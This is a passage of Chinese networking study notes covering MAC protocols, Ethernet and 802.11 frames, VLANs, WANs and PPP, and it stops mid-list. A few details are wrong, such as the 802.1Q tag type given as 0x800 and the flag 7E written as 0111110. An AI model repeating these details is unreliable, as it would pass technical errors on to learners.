<li>CSMA/CD 可以检测冲突，但无法避免；CSMA/CA 发送数据的同时不能检测信道上有无冲突，本结点处没有冲突并不意味着在接收结点处就没有冲突，只能尽量避免</li>
<li>传输介质不同。CSMA/CD 用于总线形以太网，CSMA/CA 用于无线局域网 802.1la/b/g/n 等</li>
<li>检测方式不同。CSMA/CD 通过电缆中的电压变化来检测；而 CSMA/CA 采用能量检测、载波检测和能量载波混合检测三种检测信道空闲的方式</li>
</ul>
<p><strong>CSMA/CA 协议的基本思想是</strong>：在发送数据时先广播告知其他结点，让其他结点在某段时间内不要发送数据，以免出现碰撞。CSMA/CD 协议的基本思想是发送前监听，边发送边监听，一旦出现碰撞马上停止发送。</p>
</li>
</ol>
<h4> 轮询访问：令牌传递协议</h4>
<p>在轮询访问中，用户不能随机地发送信息，而要通过一个集中控制的监控站，以循环方式轮询每个结点，再决定信道的分配。当某结点使用信道时，其他结点都不能使用信道。典型的轮询访问介质访问控制协议是令牌传递协议，它主要用在令牌环局域网中。</p>
<p>在令牌传递协议中，一个令牌（Token）沿着环形总线在各结点计算机间依次传递。令牌是一个特殊的 MAC 控制帧，它本身并不包含信息，仅控制信道的使用，确保同一时刻只有一个站点独占信道。当环上的一个站点希望传送帧时，必须等待令牌。一旦收到令牌，站点便可启动发送帧。帧中包括目的站点地址，以标识哪个站点应接收此帧。站点只有取得令牌后才能发送数据帧，因此令牌环网不会发生碰撞。站点在发送完一帧后，应释放令牌，以便让其他站使用。由于令牌在网环上是按顺序依次传递的，因此对所有入网计算机而言，访问权是公平的。</p>
<p>当计算机都不需要发送数据时，令牌就在环形网上游荡，而需要发送数据的计算机只有在拿到该令牌后才能发送数据帧，因此不会发送冲突（因为令牌只有一个）</p>
<p><strong>令牌环网中令牌和数据的传递过程如下：</strong></p>
<ul>
<li>网络空闲时，环路中只有令牌帧在循环传递</li>
<li>令牌传递到有数据要发送的站点时，该站点就修改令牌中的一个标志位，并在令牌中附加自已需要传输的数据，将令牌变成一个数据帧，然后将这个数据帧发送出去</li>
<li>数据帧沿着环路传输，接收到的站点一边转发数据，一边查看帧的目的地址。如果目的地址和自已的地址相同，那么接收站就复制该数据帧以便进一步处理</li>
<li>数据帧沿着环路传输，直到到达该帧的源站点，源站点收到自已发出去的帧后便不再转发。同时，通过检验返回的帧来查看数据传输过程中是否出错，若有错则重传</li>
<li>源站点传送完数据后，重新产生一个令牌，并传递给下一站点，以交出信道控制权</li>
</ul>
<p>在令牌传递网络中，传输介质的物理拓扑不必是一个环，但是为了把对介质访问的许可从一个设备传递到另一个设备，令牌在设备间的传递通路逻辑上必须是一个环。</p>
<p>轮询介质访问控制非常适合负载很高的广播信道。所谓负载很高的信道，是指多个结点在同一时刻发送数据概率很大的信道。可以想象，如果这样的广播信道采用随机介质访问控制，那么发生冲突的概率将会很大，而采用轮询介质访问控制则可以很好地满足各结点间的通信需求。</p>
<p>轮询介质访问控制既不共享时间，也不共享空间，它实际上是在随机介质访问控制的基础上，限定了有权力发送数据的结点只能有一个。</p>
<p>即使是广播信道也可通过介质访问控制机制使广播信道逻辑上变为点对点的信道，所以说数据链路层研究的是 “点到点” 之间的通信。</p>
<h3> 局域网</h3>
<h4> 局域网的基本概念和体系结构</h4>
<p>局域网（Local Area Network，LAN）是指在一个较小的地理范围（如一所学校）内，将各种计算机、外部设备和数据库系统等通过双绞线、同轴电缆等连接介质互相连接起来，组成资源和信息共享的计算机互连网络。<strong>主要特点如下：</strong></p>
<ul>
<li>为一个单位所拥有，且地理范围和站点数目均有限</li>
<li>所有站点共享较高的总带宽（即较高的数据传输速率）</li>
<li>较低的时延和较低的误码率</li>
<li>各站为平等关系而非主从关系</li>
<li>能进行广播和组播</li>
</ul>
<p><strong>局域网的特性</strong> 主要由三个要素决定：拓扑结构、传输介质、介质访问控制方式，其中最重要的是介质访问控制方式，它决定着局域网的技术特性。</p>
<p>常见的 <strong>局域网拓扑结构</strong> 主要有以下四大类：</p>
<ul>
<li>星形结构</li>
<li>环形结构</li>
<li>总线形结构</li>
<li>星形和总线形结合的复合型结构</li>
</ul>
<p>局域网可以使用双绞线、铜缆和光纤等多种传输介质，其中双绞线为主流传输介质。</p>
<p>局域网的介质访问控制方法主要有 CSMA/CD、令牌总线和令牌环，其中前两种方法主要用于总线形局域网，令牌环主要用于环形局域网。</p>
<p><strong>三种特殊的局域网拓扑实现如下：</strong></p>
<ul>
<li><strong>以太网（目前使用范围最广的局域网）</strong>：逻辑拓扑是总线形结构，物理拓扑是星形或拓展星形结构</li>
<li><strong>令牌环（Token Ring，IEEE 802.5）</strong>：逻辑拓扑是环形结构，物理拓扑是星形结构</li>
<li><strong>FDDI（光纤分布数字接口，IEEE 802.8）</strong>：逻辑拓扑是环形结构，物理拓扑是双环结构</li>
</ul>
<p>IEEE 802 标准定义的局域网参考模型只对应于 OSI 参考模型的数据链路层和物理层，并将数据链路层拆分为两个子层：逻辑链路控制（LLC）子层和媒体接入控制（MAC）字层。与接入传输媒体有关的内容都放在 MAC 子层，它向上层屏蔽对物理层访问的各种差异，提供对物理层的统一访问接口，主要功能包括：组帧和拆卸帧、比特传输差错检测、透明传输。LLC 子层与传输媒体无关，它向网络层提供无确认无连接、面向连接、带确认无连接、高速传送四种不同的连接服务类型。</p>
<p>由于以太网在局域网市场中取得垒断地位，几乎成为局域网的代名词，而 802 委员会制定的 LLC 子层作用已经不大，因此现在许多网卡仅装有 MAC 协议而没有 LLC 协议。</p>
<h4> 以太网与 IEEE 802.3</h4>
<p>IEEE 802.3 标准是一种基带总线形的局域网标准，它描述物理层和数据链路层的 MAC 子层的实现方法。随着技术的发展，该标准又有了大量的补充与更新，以支持更多的传输介质和更高的传输速率。</p>
<p>以太网逻辑上采用总线形拓扑结构，以太网中的所有计算机共享同一条总线，信息以广播方式发送。为了保证数据通信的方便性和可靠性，以太网简化了通信流程并使用了 CSMA/CD 方式对总线进行访问控制。</p>
<p>严格来说，以太网应当是指符合 DIX Ethernet V2 标准的局域网，但 DIX Ethernet V2 标准与 IEEE 802.3 标准只有很小的差别，因此 <strong>通常将 802.3 局域网简称为以太网。</strong></p>
<p><strong>以太网采用两项措施以简化通信：</strong></p>
<ul>
<li>采用无连接的工作方式，不对发送的数据帧编号，也不要求接收方发送确认，即以太网尽最大努力交付数据，提供的是不可靠服务，对于差错的纠正则由高层完成</li>
<li>发送的数据都使用曼彻斯特编码的信号，每个码元的中间出现一次电压转换，接收端利用这种电压转换方便地把位同步信号提取出来</li>
</ul>
<ol>
<li>
<p><strong>以太网的传输介质与网卡</strong></p>
<p>以太网常用的传输介质有四种：粗缆、细缆、双绞线和光纤。各种传输介质的适用情况见下表：</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">10BASE5</th>
<th style="text-align:center">10BASE2</th>
<th style="text-align:center">10BASE-T</th>
<th style="text-align:center">10BASE-FL</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">传输媒体</td>
<td style="text-align:center">基带同轴电缆（粗缆）</td>
<td style="text-align:center">基带同轴电缆（细缆）</td>
<td style="text-align:center">非屏蔽双绞线</td>
<td style="text-align:center">光纤对（850nm）</td>
</tr>
<tr>
<td style="text-align:center">编码方式</td>
<td style="text-align:center">曼彻斯特编码</td>
<td style="text-align:center">曼彻斯特编码</td>
<td style="text-align:center">曼彻斯特编码</td>
<td style="text-align:center">曼彻斯特编码</td>
</tr>
<tr>
<td style="text-align:center">拓扑结构</td>
<td style="text-align:center">总线形</td>
<td style="text-align:center">总线形</td>
<td style="text-align:center">星形</td>
<td style="text-align:center">点对点</td>
</tr>
<tr>
<td style="text-align:center">最大段长</td>
<td style="text-align:center">500m</td>
<td style="text-align:center">185m</td>
<td style="text-align:center">100m</td>
<td style="text-align:center">2000m</td>
</tr>
<tr>
<td style="text-align:center">最多结点数目</td>
<td style="text-align:center">100</td>
<td style="text-align:center">30</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2</td>
</tr>
</tbody>
</table>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>10BASE-T 非屏蔽双绞线以太网拓扑结构为星形网，星形网中心为集线器，但使用集线器的以太网在逻辑上仍然是一个总线形网，属于一个冲突域</p>
</div>
<p>计算机与外界局域网的连接是通过主机箱内插入的一块 <strong>网络接口板</strong>（又称网络适配器（Adapter）或网络接口卡（Network Interface Card，NIC））实现的。网卡上装有处理器和存储器，是工作在数据链路层的网络组件。网卡和局域网的通信是通过电缆或双绞线以串行方式进行的，而网卡和计算机的通信则是通过计算机主板上的 I/O 总线以并行方式进行的。因此，网卡的重要功能就是进行数据的串并转换。网卡不仅能实现与局域网传输介质之间的物理连接和电信号匹配，还涉及帧的发送与接收、帧的封装与拆封、介质访问控制、数据的编码与解码及数据缓存功能等。</p>
<p>全世界的每块网卡在出厂时都有一个唯一的代码，称为 <strong>介质访问控制（MAC）</strong> 地址，这个地址用于控制主机在网络上的数据通信。数据链路层设备（网桥、交换机等）都使用各个网卡的 MAC 地址。另外，网卡控制着主机对介质的访问，因此网卡也工作在物理层，因为它只关注比特，而不关注任何地址信息和高层协议信息。</p>
</li>
<li>
<p><strong>以太网的 MAC 帧</strong></p>
<p>每块网卡中的 MAC 地址也称物理地址；MAC 地址长 <code>6</code> 字节，一般用由连字符（或冒号）分隔的 <code>12</code> 个十六进制数表示，如：<code>02-60-8c-e4-b1-21</code>。高 <code>24</code> 位为厂商代码，低 <code>24</code> 位为厂商自行分配的网卡序列号。严格来讲，局域网的 “地址” 应是每个站的 “名字” 或标识符。</p>
<p>由于总线上使用的是广播通信，因此网卡从网络上每收到一个 MAC 帧，首先要用硬件检查 MAC 帧中的 MAC 地址。如果是发往本站的帧，那么就收下，否则丢弃。</p>
<p>以太网 MAC 帧格式有两种标准：DIX Ethernet V2 标准（即以太网 V2 标准）和 IEEE 802.3 标准。<strong>以太网 V2 的 MAC 帧格式如下所示：</strong></p>
<figure><figcaption>以太网 V2 标准的 MAC 帧格式</figcaption></figure>
<ul>
<li>
<p><strong>前导码</strong>：使接收端与发送端时钟同步。在帧前面插入的 <code>8</code> 字节可再分为两个字段：第一个字段共 <code>7</code> 字节，是 <strong>前同步码</strong>，用来快速实现 MAC 帧的比特同步；第二个字段是 <strong>帧开始定界符</strong>，表示后面的信息就是 MAC 帧。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>MAC 帧并不需要帧结束符，因为以太网在传送帧时，各帧之间必须有一定的间隙。因此，接收端只要找到帧开始定界符，其后面连续到达的比特流就都属于同一个 MAC 帧，所以只有帧开始定界符。但不要误以为以太网，MAC 帧不需要尾部，在数据链路层上；帧既要加首部，也要加尾部</p>
</div>
</li>
<li>
<p><strong>目的地址和源地址</strong>：通常使用 <code>6</code> 字节（48bit）地址（MAC 地址）</p>
</li>
<li>
<p><strong>类型</strong>：<code>2</code> 字节，指出数据域中携带的数据应交给哪个协议实体处理</p>
</li>
<li>
<p><strong>数据</strong>：<code>46~1500</code> 字节，包含高层的协议消息。由于 CSMA/CD 算法的限制，以太网帧必须满足最小长度要求 <code>64</code> 字节，数据较少时必须加以填充（<code>0~46</code> 字节）</p>
<div class="hint-container tip">
<p class="hint-container-title">46 是怎么来的？</p>
<p>由 CSMA/CD 可知以太网帧的最短帧长为 <code>64B</code>，而 MAC 帧的首部和尾部的长度为 <code>18</code> 字节，所以数据字段最短为 <code>64 - 18 = 46</code> 字节。最大的 <code>1500</code> 字节是规定的</p>
</div>
</li>
<li>
<p><strong>填充</strong>：<code>0~46</code> 字节，当帧长太短时填充帧，使之达到 <code>64</code> 字节的最小长度</p>
</li>
<li>
<p><strong>校验码（FCS）</strong>：<code>4</code> 字节，校验范围从目的地址段到数据段的末尾，算法采用 <code>32</code> 位循环允余码（CRC），不但需要检验 MAC 帧的数据部分，还要检验目的地址、源地址和类型字段，但不校验前导码</p>
</li>
</ul>
<p>802.3 帧格式与 DIX 以太帧格式的不同之处在于用长度域替代了 DIX 帧中的类型域，指出数据域的长度。在实践中，前述长度/类型两种机制可以并存，由于 IEEE 802.3 数据段的最大字节数是 <code>1500</code>，所以长度段的最大值是 <code>1500</code>，因此从 <code>1501</code> 到 <code>65535</code> 的值可用于类型段标识符。</p>
</li>
<li>
<p><strong>高速以太网</strong></p>
<p>速率达到或超过 <code>100Mb/s</code> 的以太网称为高速以太网。</p>
<ul>
<li>
<p><strong>100BASE-T 以太网</strong></p>
<p>100BASE-T 以太网是在双绞线上传送 <code>100Mb/s</code> 基带信号的星形拓扑结构以太网，它使用 CSMA/CD 协议。这种以太网既支持全双工方式，又支持半双工方式，可在全双工方式下工作而无冲突发生，因此在全双工方式下不使用 CSMA/CD 协议。</p>
<p>MAC 帧格式仍然是 802.3 标准规定的。保持最短帧长不变，但将一个网段的最大电缆长度减小到 <code>100m</code>。帧间时间间隔从原来的 <code>9.6μs</code> 改为现在的 <code>0.96μs</code>。</p>
</li>
<li>
<p><strong>吉比特以太网</strong></p>
<p>吉比特以太网又称千兆以太网，允许在 <code>1Gb/s</code> 速率下用全双工和半双工两种方式工作。使用 802.3 协议规定的帧格式。在半双工方式下使用 CSMA/CD 协议（全双工方式不需要使用 CSMA/CD 协议）。与 10BASE-T 和 100BASE-T 技术向后兼容。</p>
</li>
<li>
<p><strong>10 吉比特以太网</strong></p>
<p>10 吉比特以太网与 <code>10Mb/s</code>、<code>100Mb/s</code> 和 <code>1Gb/s</code> 以太网的帧格式完全相同。10 吉比特以太网还保留了 802.3 标准规定的以太网最小和最大帧长，便于升级。这种以太网不再使用铜线而只使用光纤作为传输媒体。只工作在全双工方式，因此没有争用问题，也不使用 CSMA/CD 协议。</p>
</li>
</ul>
<p>以太网从 <code>10Mb/s</code> 到 <code>10Gb/s</code> 的演进证明了以太网是可扩展的（从 <code>10Mb/s~10Gb/s</code>）、灵活的（多种传输媒体、全/半双工、共享/交换），易于安装，稳健性好。</p>
</li>
</ol>
<h4> IEEE 802.11 无线局域网</h4>
<ol>
<li>
<p><strong>无线局域网的组成</strong></p>
<p>无线局域网可分为两大类：有固定基础设施的无线局域网和无固定基础设施的移动自组织网络。所谓 “固定基础设施”，是指预先建立的、能覆盖一定地理范围的固定基站。</p>
<ul>
<li>
<p><strong>有固定基础设施无线局域网</strong></p>
<p>对于有固定基础设施的无线局域网，IEEE 制定了无线局域网的 802.11 系列协议标准，包括 802.1la/b/g/n 等。802.11 使用星形拓扑，其中心称为 <strong>接入点（Access Point，AP）</strong>，在 MAC 层使用 CSMA/CA 协议。使用 802.11 系列协议的局域网又称 Wi-Fi。</p>
<p>802.11 标准规定无线局域网的最小构件是 <strong>基本服务集 BSS（Basic Service Set，BSS）</strong>。一个基本服务集包括一个接入点和若干移动站。各站在本 BSS 内之间的通信，或与本 BSS 外部站的通信，都必须通过本 BSS 的 AP。上面提到的 AP 就是基本服务集中的基站（base station）。安装 AP 时，必须为该 AP 分配一个不超过 <code>32</code> 字节的 <strong>服务集标识符（Service Set IDentifier，SSID）</strong> 和一个信道。SSID 是指使用该 AP 的无线局域网的名字。一个基本服务集覆盖的地理范围称为一个 <strong>基本服务区（Basic Service Area，BSA）</strong>，无线局域网的基本服务区的范围直径一般不超过 <code>100m</code>。</p>
<p>一个基本服务集可以是孤立的，也可通过 AP 连接到一个 <strong>分配系统（Distribution System，DS）</strong>，然后再连接到另一个基本服务集，就构成了一个 <strong>扩展的服务集（Extended Service Set，ESS）</strong>。分配系统的作用就是使扩展的服务集对上层的表现就像一个基本服务集一样。ESS 还可以通过一种称为 <strong>Portal（门户）</strong> 的设备为无线用户提供到有线连接的以太网的接入。门户的作用相当于一个网桥。</p>
</li>
<li>
<p><strong>无固定基础设施移动自组织网络</strong></p>
<p>另一种无线局域网是无固定基础设施的无线局域网，又称 <strong>自组网络（ad hoc network）</strong>。自组网络没有上述基本服务集中的 AP，而是由一些平等状态的移动站相互通信组成的临时网络。各结点之间地位平等，中间结点都为转发结点，因此都具有路由器的功能。</p>
<p><strong>自组网络通常的构成</strong>：一些可移动设备发现在它们附近还有其他的可移动设备，并且要求和其他移动设备进行通信。自组网络中的每个移动站都要参与网络中其他移动站的路由的发现和维护，同时由移动站构成的网络拓扑可能随时间变化得很快，因此在固定网络中行之有效的一些路由选择协议对移动自组网络已不适用。</p>
<p>自组网络和移动 IP 并不相同。移动 IP 技术使漫游的主机可以用多种方法连接到因特网，其核心网络功能仍然是基于固定网络中一直使用的各种路由选择协议。而自组网络是把移动性扩展到无线领域中的自治系统，具有自己特定的路由选择协议，并且可以不和因特网相连。</p>
</li>
</ul>
</li>
<li>
<p><strong>802.11 局域网的 MAC 帧</strong></p>
<p>802.11 帧共有三种类型，即数据帧、控制帧和管理帧。数据帧的格式如下图所示：</p>
<figure><figcaption>局域网数据帧的格式</figcaption></figure>
<p>802.11 数据帧由以下三大部分组成：</p>
<ul>
<li><strong>MAC 首部</strong>：共 <code>30</code> 字节，帧的复杂性都在 MAC 首部</li>
<li><strong>帧主体</strong>：即帧的数据部分，不超过 <code>2312</code> 字节。它比以太网的最大长度长很多</li>
<li><strong>帧检验序列 FCS</strong>：是尾部，共 <code>4</code> 字节</li>
</ul>
<p>802.11 帧的 MAC 首部中最重要的是 <code>4</code> 个地址字段（都是 MAC 地址）。这里仅讨论前三种地址（地址 4 用于自组网络）。这三个地址的内容取决于帧控制字段中的 “去往 AP” 和 “来自 AP” 这两个字段的数值。下表中给出了 802.11 帧的地址字段最常用的两种情况：</p>
<table>
<thead>
<tr>
<th style="text-align:center">去往 AP</th>
<th style="text-align:center">来自 AP</th>
<th style="text-align:center">地址 1</th>
<th style="text-align:center">地址 2</th>
<th style="text-align:center">地址 3</th>
<th style="text-align:center">地址 4</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">接收地址 = 目的地址</td>
<td style="text-align:center">发送地址 = AP 地址</td>
<td style="text-align:center">源地址</td>
<td style="text-align:center">——</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">接收地址 = AP 地址</td>
<td style="text-align:center">发送地址 = 源地址</td>
<td style="text-align:center">目的地址</td>
<td style="text-align:center">——</td>
</tr>
</tbody>
</table>
<p>地址 <code>1</code> 是直接接收数据帧的结点地址，地址 <code>2</code> 是实际发送数据帧的结点地址。</p>
<ul>
<li>现假定在一个 BSS 中的站 <code>A</code> 向站 <code>B</code> 发送数据帧。在站 <code>A</code> 发往接入点 AP 的数据帧的帧控制字段中 “去往 AP = 1” 而 “来自 AP = 0”；地址 <code>1</code> 是 AP 的 MAC 地址，地址 <code>2</code> 是 <code>A</code> 的 MAC 地址，地址 <code>3</code> 是 <code>B</code> 的 MAC 地址。注意，“接收地址” 与 “目的地址” 并不等同</li>
<li>AP 接收到数据帧后，转发给站 B，此时在数据帧的帧控制字段中，“去往 AP = 0” 而 “来自 AP = 1"；地址 <code>1</code> 是 <code>B</code> 的 MAC 地址，地址 <code>2</code> 是 AP 的 MAC 地址，地址 <code>3</code> 是 <code>A</code> 的 MAC 地址。注意，“发送地址” 与 “源地址” 也不等同</li>
</ul>
<p>一种更复杂的情况：两个 AP 通过有线连接到路由器，现在路由器要向站 <code>A</code> 发送数据。路由器是网络层设备，它看不见链路层的接入点 AP，只认识站 <code>A</code> 的 IP 地址。而 AP 是链路层设备，它只认识 MAC 地址，并不认识 IP 地址。</p>
<ul>
<li>路由器从 IP 数据报获知 <code>A</code> 的 IP 地址，并使用 ARP 获取站 <code>A</code> 的 MAC 地址。获取站 A 的 MAC 地址后，路由器接口 R1 将该 IP 数据报封装成 802.3 帧（802.3 帧只有两个地址），该帧的源地址字段是 <code>R1</code> 的 MAC 地址，目的地址字段是 <code>A</code> 的 MAC 地址。</li>
<li>AP 收到该 802.3 帧后，将该 802.3 帧转换为 802.11 帧，在帧控制字段中，“去往 AP = 0” 而 “来自 AP = 1”；地址 <code>1</code> 是 <code>A</code> 的 MAC 地址，地址 <code>2</code> 是 AP 的 MAC 地址，地址 <code>3</code> 是 <code>R1</code> 的 MAC 地址。这样，<code>A</code> 可以确定（从地址 <code>3</code>）将数据报发送到子网中的路由器接口的 MAC 地址。</li>
</ul>
<p>现在考虑从站 <code>A</code> 向路由器接口 <code>R1</code> 发送数据的情况：</p>
<ul>
<li>站 <code>A</code> 生成一个 802.11 帧，在帧控制字段中，“去往 AP = 1” 而 “来自 AP = 0”；地址 <code>1</code> 是 AP 的 MAC 地址，地址 <code>2</code> 是 <code>A</code> 的 MAC 地址，地址 <code>3</code> 是 <code>R1</code> 的 MAC 地址。</li>
<li>AP 收到该 802.11 帧后，将其转换为 802.3 帧。该帧的源地址字段是 <code>A</code> 的 MAC 地址，目的地址字段是 <code>R1</code> 的 MAC 地址。</li>
</ul>
<p>由此可见，地址 <code>3</code> 在 BSS 和有线局域网互连中起着关键作用，它允许 AP 在构建以太网帧时能够确定目的 MAC 地址。</p>
</li>
</ol>
<h4> VLAN 基本概念与基本原理</h4>
<p>一个以太网是一个广播域，当一个以太网包含的计算机太多时，往往会导致：</p>
<ul>
<li>以太网中出现大量的广播帧，特别是经常使用的 ARP 和 DHCP 协议</li>
<li>一个单位的不同部门共享一个局域网，对信息保密和安全不利</li>
</ul>
<p>通过 <strong>虚拟局域网（Virtual LAN）</strong>，可以把一个较大的局域网分割成一些较小的与地理位置无关的逻辑上的 VLAN，而每个 VLAN 是一个较小的广播域。</p>
<p>802.3ac 标准定义了支持 VLAN 的以太网帧格式的扩展。它在以太网帧中插入一个 <code>4</code> 字节的标识符（插入在源地址字段和类型字段之间），称为 VLAN 标签，用来指明发送该帧的计算机属于哪个虚拟局域网。插入 VLAN 标签的帧称为 802.1Q 帧。由于 VLAN 帧的首部增加了 <code>4</code> 字节，因此以太网的最大帧长从原来的 <code>1518</code> 字节变为 <code>1522</code> 字节。</p>
<p>VLAN 标签的前两个字节置为 <code>0x800</code> 表示这是一个 802.1Q 帧，在 VLAN 标签的后两个字节中，前 <code>4</code> 位没有用，后 <code>12</code> 位是该 VLAN 的标识符 VID，它唯一标了该 802.1Q 帧属于哪个 VLAN。<code>12</code> 位的 VID 可识别 <code>4096</code> 个不同的 VLAN。插入 VID 后，802.1Q 帧的 FCS 必须重新计算。</p>
<p>例如：交换机 <code>1</code> 连接了 <code>7</code> 台计算机（A、B、C、D、E、F、G），该局域网划分为两个虚拟局域网 VLAN-10（A、B、C、D） 和 VLAN-20（E、F、G），这里的 <code>10</code> 和 <code>20</code> 就是 802.1Q 帧中的 VID 字段的值，由交换机管理员设定。各主机并不知道自已的 VID 值（但交换机必须知道），主机与交换机之间交互的都是标准以太网帧。一个 VLAN 的范围可以跨越不同的交换机，前提是所用的交换机能够识别和处理 VLAN。交换机 <code>2</code> 连接了 <code>5</code> 台计算机（H、I、J、K、L），并与交换机 <code>1</code> 相连。交换机 <code>2</code> 中的 <code>2</code> 台计算机加入 VLAN-10（H、I），另外 <code>3</code> 台加入 VLAN-20（J、K、L）。这两个 VLAN 虽然都跨越了两个交换机，但各自都是一个广播域。</p>
<p>假定 <code>A</code> 向 <code>B</code> 发送帧，交换机 <code>1</code> 根据帧首部的目的 MAC 地址，识别 <code>B</code> 属于本交换机管理的 VLAN-10，因此就像在普通以太网中那样直接转发帧。假定 <code>A</code> 向 <code>H</code> 发送帧，交换机 <code>1</code> 必须把帧转发到交换机 <code>2</code>，但在转发前，要插入 VLAN 标签，否则交换机 <code>2</code> 不知道应把帧转发给哪个 VLAN。因此在交换机端口之间的链路上传送的帧是 802.1Q 帧。交换机 <code>2</code> 在向 <code>H</code> 转发帧之前，要拿走已插入的 VLAN 标签，因此 <code>H</code> 收到的帧是 <code>A</code> 发送的标准以太网帧，而不是 802.1Q 帧。如果 <code>A</code> 向 <code>E</code> 发送帧，那么情况就复杂了，因为这是在不同网络之间的通信，虽然 <code>A</code> 和 <code>C</code> 都连接到同一个交换机，但是它们已经处在不同的网络中（VLAN-10 和 VLAN-20），需要通过上层的路由器来解决，也可以在交换机中嵌入专用芯片来进行转发，这样就在交换机中实现了第 <code>3</code> 层的转发功能。</p>
<p>虚拟局域网只是局域网给用户提供的一种服务，并不是一种新型局域网。</p>
<h3> 广域网</h3>
<h4> 广域网的基本概念</h4>
<p>广域网通常是指覆盖范围很广（远超一个城市的范围）的长距离网络。广域网是因特网的核心部分，其任务是长距离运送主机所发送的数据。连接广域网各结点交换机的链路都是高速链路，它可以是长达几千千米的光缆线路，也可以是长达几万千米的点对点卫星链路。因此广域网首要考虑的问题是通信容量必须足够大，以便支持日益增长的通信量。</p>
<p>广域网不等于互联网。互联网可以连接不同类型的网络（既可以连接局域网，又可以连接广域网），通常使用路由器来连接。局域网可以通过广域网与另一个相隔很远的局域网通信。</p>
<p>广域网由一些结点交换机（注意不是路由器，结点交换机和路由器都用来转发分组，它们的工作原理也类似。结点交换机在单个网络中转发分组而路由器在多个网络构成的互联网中转发分组）及连接这些交换机的链路组成。结点交换机的功能是将分组存储并转发。结点之间都是点到点连接，但为了提高网络的可靠性，通常一个结点交换机往往与多个结点交换机相连。</p>
<p>从层次上考虑，广域网和局域网的区别很大，因为 <strong>局域网使用的协议主要在数据链路层（还有少量在物理层），而广域网使用的协议主要在网络层</strong>。简单理解就是：如果网络中的两个结点要进行数据交换，那么结点除要给出数据外，还要给数据 “包装” 上一层控制信息，用于实现检错纠错等功能。如果这层控制信息是数据链路层协议的控制信息，那么就称使用了数据链路层协议，如果这层控制信息是网络层的控制信息，那么就称使用了网络层协议。</p>
<p><strong>广域网和局域网的区别与联系见下表：</strong></p>
<table>
  <tbody><tr style="text-align:center">
    <th>特点</th>
    <th>广域网</th>
    <th>局域网</th>
  </tr>
  <tr>
    <td style="text-align:center">覆盖范围</td>
    <td>很广，通常跨区域</td>
    <td>较小，通常在一个区域内</td>
  </tr>
  <tr>
    <td style="text-align:center">连接方式</td>
    <td>结点之间都是点到点连接，但为了提高网络的可靠性，一个结点交换机往往与多个结点交换机相连</td>
    <td>普遍采用多点接入技术</td>
  </tr>
  <tr>
    <td style="text-align:center">OSI 参考模型层次</td>
    <td>三层：物理层，数据链路层，网络层</td>
    <td>两层：物理层，数据链路层</td>
  </tr>
  <tr>
    <td style="text-align:center">联系与相似点</td>
    <td colspan="2">1. 广域网和局域网都是互联网的重要组成构件，从互联网的角度上看，二者平等（不是包含关系） <br> 2. 连接到一个广域网或一个局域网上的主机在该网内进行通信时，只需要使用其网络的物理地址</td>
  </tr>
  <tr>
    <td style="text-align:center">着重点</td>
    <td>强调资源共享</td>
    <td>强调数据传输</td>
  </tr>
</tbody></table>
<p>广域网中的一个重要问题是路由选择和分组转发。路由选择协议负责搜索分组从某个结点到目的结点的最佳传输路由，以便构造路由表，然后从路由表再构造出转发分组的转发表。分组是通过转发表进行转发的。</p>
<p>常见的两种广域网数据链路层协议是 PPP 协议和 HDLC 协议。PPP 目前使用得最广泛，而 HDLC 已很少使用。</p>
<h4> PPP 协议</h4>
<p><strong>点对点协议（Point-to-Point Protocol，PPP）</strong> 是使用串行线路通信的面向字节的协议，该协议应用在直接连接两个结点的链路上。设计的目的主要是用来通过拨号或专线方式建立点对点连接发送数据，使其成为各种主机、网桥和路由器之间简单连接的一种共同的解决方案。</p>
<p><strong>PPP 协议有三个组成部分：</strong></p>
<ul>
<li><strong>链路控制协议（LCP）</strong>：一种扩展链路控制协议，用于建立、配置、测试和管理数据链路</li>
<li><strong>网络控制协议（NCP）</strong>：PPP 协议允许同时采用多种网络层协议，每个不同的网络层协议要用一个相应的 NCP 来配置，为网络层协议建立和配置逻辑连接</li>
<li><strong>一个将 IP 数据报封装到串行链路的方法</strong>：IP 数据报在 PPP 帧中就是其信息部分，这个信息部分的长度受最大传送单元（MTU）的限制</li>
</ul>
<p>PPP 帧的前 <code>3</code> 个字段和最后 <code>2</code> 个字段与 HDLC 帧是一样的，标志字段（F）仍为 7E（0111110），前后各占 <code>1</code> 字节，若它出现在信息字段中，就必须做字节填充，使用的控制转义字节是 7D（01111101）。但在 PPP 中，地址字段（A）占 <code>1</code> 字节，规定为 <code>0xFF</code>，控制字段（C）占 <code>1</code> 字节，规定为 <code>0x03</code>，两者的内容始终是固定不变的。PPP 是面向字节的，因而所有 PPP 帧的长度都是整数个字节。</p>
<p>第 <code>4</code> 个字段是协议段，占 <code>2</code> 字节，在 HDLC 中没有该字段，它是说明信息段中运载的是什么种类的分组。以比特 <code>0</code> 开始的是诸如：IP、IPX 和 AppleTalk 这样的网络层协议；以比特 <code>1</code> 开始的被用来协商其他协议，包括 LCP 及每个支持的网络层协议的一个不同的 NCP。</p>
<p>第 <code>5</code> 段信息段的长度是可变的，大于或等于 <code>0</code> 且小于或等于 <code>1500B</code>。为了实现透明传输，当信息段中出现和标志字段一样的比特组合时，必须采用一些措施来改进。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>因为 PPP 是点对点的，并不是总线形，所以无须采用 CSMA/CD 协议，自然就没有最短帧，所以信息段占 <code>0~1500</code> 字节，而不是 <code>46~1500</code> 字节。另外，当数据部分出现和标志位一样的比特组合时，就需要采用一些措施来实现透明传输</p>
</div>
<p>第 <code>6</code> 个字段是帧检验序列（FCS），占 <code>2</code> 字节，即循环冗余码检验中的余码。检验区包括地址字段、控制字段、协议字段和信息字段。</p>
<p>当线路处于静止状态时，不存在物理层连接。当线路检测到载波信号时，建立物理连接，线路变为建立状态。此时，LCP 开始选项商定，商定成功后就进入身份验证状态。身份验证通过后，进入网络层协议状态。这时，采用 NCP 配置网络层，配置成功后，进入打开状态，然后就可进行数据传输。当数据传输完成后，线路转为终止状态。载波停止后则回到静止状态。</p>
<p><strong>PPP 协议的特点：</strong></p>
<ul>
